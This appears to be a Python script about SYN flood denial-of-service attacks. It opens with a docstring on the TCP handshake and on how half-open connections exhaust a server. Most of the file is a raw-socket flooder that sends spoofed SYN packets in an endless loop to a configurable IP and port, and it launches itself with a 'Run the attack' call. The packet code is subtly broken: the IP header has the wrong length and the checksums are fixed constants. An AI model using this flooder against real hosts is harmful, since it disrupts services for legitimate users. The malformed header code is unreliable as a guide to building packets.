'''
A SYN flood attack is a type of denial-of-service (DoS) attack that exploits the TCP handshake process to overwhelm a 
target server with a large number of connection requests, causing it to become slow or unresponsive to legitimate users.

How It Works

TCP Handshake Basics:

Normally, when a client wants to establish a connection with a server, it uses a three-step process known as the TCP handshake:
SYN: The client sends a SYN (synchronize) packet to the server to request a connection.
SYN-ACK: The server responds with a SYN-ACK (synchronize-acknowledge) packet to acknowledge the request.
ACK: The client sends an ACK (acknowledge) packet to establish the connection.

SYN Flood Attack:

In a SYN flood attack, the attacker sends a large number of SYN packets to the server, but does not complete the handshake by 
sending the final ACK packet. 
The server allocates resources and keeps waiting for the ACK packet, which never arrives.
Because the server is waiting for many unfinished connections, it runs out of resources to handle legitimate requests.

Impact
Resource Exhaustion: The server becomes overwhelmed and cannot handle new legitimate connections.
Service Disruption: Legitimate users experience delays or are unable to access the server.
'''

import socket
import random

target_ip = "127.0.0.1"  # Target server IP
target_port = 9999       # Target server port

def send_syn_flood():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        # IP Header
        ip_header = bytes([0x45, 0x00, 0x00, 0x28]) + \
                    bytes([random.randint(0, 255) for _ in range(6)]) + \
                    bytes([0x40, 0x06, 0xb1, 0xe6]) + \
                    socket.inet_aton("192.168.1.100") + \
                    socket.inet_aton(target_ip)
        
        # TCP Header
        tcp_header = bytes([random.randint(0, 255) for _ in range(2)]) + \
                     bytes([target_port // 256, target_port % 256]) + \
                     bytes([random.randint(0, 255) for _ in range(8)]) + \
                     bytes([0x50, 0x02, 0x72, 0x10]) + \
                     bytes([0x00, 0x00, 0x00, 0x00]) + \
                     bytes([0x02, 0x04, 0x05, 0xb4])
        
        packet = ip_header + tcp_header
        s.sendto(packet, (target_ip, target_port))

# Run the attack
send_syn_flood()
